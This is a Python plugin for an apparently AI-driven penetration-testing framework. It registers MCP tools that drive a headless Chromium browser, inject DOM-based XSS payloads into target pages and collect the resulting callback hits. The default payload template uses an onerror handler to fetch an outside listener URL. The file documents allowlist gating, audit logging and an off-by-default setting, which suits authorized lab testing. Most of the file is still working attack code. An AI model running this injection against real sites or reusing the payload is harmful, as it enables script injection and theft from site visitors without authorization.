"""Headless browser attack plugin for NetAttackAi.

Wraps Playwright + Chromium to drive authenticated web flows and harvest
XSS-hunter callbacks. Browser-based attacks: authenticated flows, DOM-based
XSS, hook callbacks.

SAFETY (lab build):
* Plugin is OFF by default; opt in via ``config plugins.enabled``.
* Every target-touching MCP tool is wrapped with ``ctx.require_allowlist()`` so
  the target-IP allowlist lock + JSONL audit trail apply automatically.
* XSS callback hosts (the operator's listener) are target-side: the operator
  MUST add them to ``exploit.allowed_targets`` explicitly (exact host:port,
  never a wildcard). The plugin never auto-authorizes callback hosts.
* No log clearing, timestomping, EDR/AV defeat, DoS, or malware distribution.
"""

from __future__ import annotations

import json
import logging
from pathlib import Path
from typing import Any

from tools.plugins import Plugin, PluginManifest, PluginRegistry

log = logging.getLogger("plugins.browser_attack")

_MANIFEST_PATH = Path(__file__).resolve().parent / "plugin.yaml"


def _browser_cfg(config: dict[str, Any] | None) -> dict[str, Any]:
    cfg_block = (config or {}).get("browser_attack") or {}
    return cfg_block if isinstance(cfg_block, dict) else {}


def _get_playwright(config: dict[str, Any] | None) -> Any | None:
    """Lazy import the playwright sync API. Returns None on failure."""
    if not _browser_cfg(config).get("enabled", False):
        return None
    try:
        from playwright.sync_api import sync_playwright  # type: ignore
        return sync_playwright
    except ImportError:
        log.warning("browser_attack: 'playwright' python package not installed; tools will refuse")
        return None


# ---------------------------------------------------------------------------
# A simple in-memory XSS callback registry (no real listener; the operator
# starts a real listener separately and adds its host to allowed_targets).
# ---------------------------------------------------------------------------

# ponytail: a single in-memory dict keyed by callback id. Ceiling: not
# cross-process; an upgrade path is a shared SQLite callback log when
# parallel browser sessions need to share state.
_XSS_CALLBACKS: dict[str, dict[str, Any]] = {}


def _record_callback(callback_id: str, payload: str, source_ip: str = "") -> None:
    _XSS_CALLBACKS[callback_id] = {
        "callback_id": callback_id,
        "payload": payload,
        "source_ip": source_ip,
        "received_at": __import__("time").time(),
    }


def _reset_callbacks() -> None:
    """Test hook."""
    _XSS_CALLBACKS.clear()


# ---------------------------------------------------------------------------
# Plugin
# ---------------------------------------------------------------------------


class BrowserAttackPlugin(Plugin):
    """Plugin wrapper that registers the browser-attack MCP tools."""

    manifest: PluginManifest

    def __init__(self) -> None:
        self.manifest = self._load_manifest()

    @staticmethod
    def _load_manifest() -> PluginManifest:
        text = _MANIFEST_PATH.read_text(encoding="utf-8")
        from tools.plugins import _parse_manifest_yaml  # type: ignore

        return PluginManifest.from_dict(_parse_manifest_yaml(text))

    def register(self, registry: PluginRegistry) -> None:
        registry.register_mcp_tools(_register_browser_tools)


def _register_browser_tools(mcp: Any, ctx: Any) -> None:
    """Register browser-attack MCP tools. Every tool is allowlist-gated via ctx."""
    require_allowlist = ctx.require_allowlist
    workspace = ctx.workspace
    config = ctx.config

    @mcp.tool()
    @require_allowlist(target_param="target_ip", audit=True)
    def browser_navigate(target_ip: str, url: str, screenshot: bool = False) -> str:
        """Navigate a headless browser to a URL on the target and return page metadata.

        Requires the Playwright + Chromium stack (``pip install playwright &&
        playwright install chromium``). The target_ip is allowlist-gated; the
        URL's host must resolve to an allowlisted IP.
        """
        if not url or not url.strip():
            return "BLOCKED: url is required."
        cfg = _browser_cfg(config)
        if not cfg.get("enabled", False):
            return "BLOCKED: browser_attack plugin not enabled in config."

        sync_playwright = _get_playwright(config)
        if sync_playwright is None:
            return "BLOCKED: playwright not installed; run 'pip install playwright && playwright install chromium'."

        browser_name = str(cfg.get("browser", "chromium"))
        headless = bool(cfg.get("headless", True))
        timeout_ms = int(cfg.get("timeout_seconds", 60)) * 1000

        out: dict[str, Any] = {"target": target_ip, "url": url, "error": ""}
        try:
            with sync_playwright() as p:
                browser = getattr(p, browser_name).launch(headless=headless)
                page = browser.new_page()
                page.goto(url, timeout=timeout_ms)
                out["title"] = page.title()
                out["status"] = "ok"
                if screenshot:
                    shot_path = workspace / "browser_screenshot.png"
                    workspace.mkdir(parents=True, exist_ok=True)
                    page.screenshot(path=str(shot_path))
                    out["screenshot"] = str(shot_path)
                browser.close()
        except Exception as exc:  # noqa: BLE001
            out["status"] = "error"
            out["error"] = str(exc)[:500]

        return f"BROWSER_NAVIGATE_RESULT:\n{json.dumps(out, indent=2)}"

    @mcp.tool()
    @require_allowlist(target_param="target_ip", audit=True)
    def browser_dom_xss_probe(
        target_ip: str,
        url: str,
        payload_template: str = "<img src=x onerror=fetch('{CALLBACK}?c={ID}')>",
        callback_id: str = "",
    ) -> str:
        """Inject DOM-based XSS payloads into the target's URL and report any
        callback hits recorded by the operator's XSS listener.

        The XSS callback host MUST be in exploit.allowed_targets (exact
        host:port, never a wildcard). The plugin records callback hits in an
        in-memory registry; the operator runs a separate listener that calls
        browser_xss_callbacks to harvest.
        """
        if not url or not url.strip():
            return "BLOCKED: url is required."
        cfg = _browser_cfg(config)
        if not cfg.get("enabled", False):
            return "BLOCKED: browser_attack plugin not enabled in config."

        callback_host = str(cfg.get("xss_callback_host", ""))
        callback_port = int(cfg.get("xss_callback_port", 5555))
        if not callback_host:
            return (
                "BLOCKED: xss_callback_host not set in config (browser_attack.xss_callback_host). "
                "Add the operator's XSS listener host:port to exploit.allowed_targets explicitly."
            )

        # Re-check that the callback host is in the operator allowlist.
        from tools.mcp_shared import _check_allowlist  # type: ignore

        ok, why = _check_allowlist(callback_host, config)
        if not ok:
            return (
                f"BLOCKED: callback_host {callback_host} not in exploit.allowed_targets\n"
                f"REASON: {why}\n"
                f"NOTE: Add the exact host:port of your XSS listener to "
                f"exploit.allowed_targets."
            )

        # Generate a callback id if not supplied.
        if not callback_id:
            import secrets

            callback_id = secrets.token_hex(8)
        callback_url = f"http://{callback_host}:{callback_port}/?c={callback_id}"
        payload = payload_template.replace("{CALLBACK}", callback_url).replace("{ID}", callback_id)

        sync_playwright = _get_playwright(config)
        if sync_playwright is None:
            return "BLOCKED: playwright not installed; run 'pip install playwright && playwright install chromium'."

        browser_name = str(cfg.get("browser", "chromium"))
        headless = bool(cfg.get("headless", True))
        timeout_ms = int(cfg.get("timeout_seconds", 60)) * 1000

        out: dict[str, Any] = {
            "target": target_ip,
            "url": url,
            "callback_id": callback_id,
            "callback_url": callback_url,
            "payload": payload,
            "status": "ok",
            "error": "",
        }
        try:
            with sync_playwright() as p:
                browser = getattr(p, browser_name).launch(headless=headless)
                page = browser.new_page()
                # Inject the payload via a URL fragment + an in-page eval.
                page.goto(url, timeout=timeout_ms)
                page.evaluate(f"document.body.innerHTML += {json.dumps(payload)}")
                page.wait_for_timeout(2000)
                browser.close()
        except Exception as exc:  # noqa: BLE001
            out["status"] = "error"
            out["error"] = str(exc)[:500]

        return f"BROWSER_DOM_XSS_RESULT:\n{json.dumps(out, indent=2)}"

    @mcp.tool()
    @require_allowlist(target_param="target_ip", audit=True)
    def browser_xss_callbacks(target_ip: str) -> str:
        """List XSS callback hits recorded by this plugin's in-memory registry.

        This tool is advisory: the operator runs a separate listener that calls
        ``browser_xss_record_callback`` to feed hits into the registry. The
        allowlist gate applies for audit-trail consistency; no target touch.
        """
        if not _XSS_CALLBACKS:
            return "BROWSER_XSS_CALLBACKS: none recorded"
        return (
            "BROWSER_XSS_CALLBACKS:\n" +
            json.dumps(list(_XSS_CALLBACKS.values()), indent=2, default=str)
        )

    @mcp.tool()
    @require_allowlist(target_param="target_ip", audit=True)
    def browser_xss_record_callback(target_ip: str, callback_id: str, payload: str, source_ip: str = "") -> str:
        """Record an XSS callback hit. Called by the operator's listener, not
        the target. The allowlist gate applies for audit-trail consistency.
        """
        if not callback_id or not callback_id.strip():
            return "BLOCKED: callback_id is required."
        _record_callback(callback_id.strip(), payload or "", source_ip or "")
        return f"BROWSER_XSS_RECORDED: {callback_id}"


def create_plugin() -> Plugin:
    """Factory invoked by PluginManager when loading this plugin."""
    return BrowserAttackPlugin()
